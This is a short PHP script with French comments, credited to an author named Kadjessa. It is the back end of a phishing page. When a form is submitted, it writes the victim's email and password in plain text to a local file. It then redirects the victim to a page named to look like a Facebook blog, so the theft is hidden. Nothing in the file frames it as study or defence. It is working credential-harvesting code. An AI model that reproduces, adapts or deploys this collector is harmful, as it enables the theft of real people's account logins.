<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Récupérer les informations saisies
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);

    // Préparer les données à enregistrer dans le fichier
    $donnees = "Email: " . $email . "\n" .
               "Password: " . $password . "\n" .
               "----------------------------\n";

    // Chemin du fichier où les données seront enregistrées
    $file = 'fichier.txt';

    // Vérifier si le fichier existe et est accessible
    if (is_writable($file)) {
        // Enregistrer les données dans le fichier (en ajoutant à la fin)
        file_put_contents($file, $donnees, FILE_APPEND);

        // Rediriger vers une autre page après l'enregistrement
        header("Location: www.facebook.com_le_blog_de_Karim_dieng.html"); // Remplace "page_succes.php" par l'URL de la page de redirection
        exit(); // Toujours appeler exit après header() pour arrêter l'exécution du script
    } else {
        echo "Le fichier n'est pas accessible en écriture.";
    }
} else {
    echo "Aucune donnée reçue.";
}
?>
<!--Auteur : Kadjessa - Date : 2025-->